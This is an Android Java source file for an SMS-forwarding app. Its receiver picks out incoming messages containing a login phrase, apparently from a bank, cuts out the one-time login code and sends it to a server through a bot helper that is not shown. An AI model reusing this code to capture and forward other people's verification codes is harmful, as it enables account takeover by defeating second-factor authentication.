package com.example.smsforwardapp;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

//Прослушка на входящие sms-сообщения
public class SmsReceiver extends BroadcastReceiver {
    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    @Override
    public void onReceive(Context context, Intent intent) {
        // Получаем SMS-сообщение
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    //Достаём отправителя и тело сообщения
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String messageBody = smsMessage.getMessageBody();

                    // Проверяем, содержит ли сообщение нужный текст
                    if (messageBody.contains("Вход в Т")) {
                        //Пересылаем сообщение через бота
                        String str = messageBody.substring(23, 27);
                        Sender.sendToServer(context, str);
                        Toast.makeText(context, "Код входа переслан", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        }
    }
}
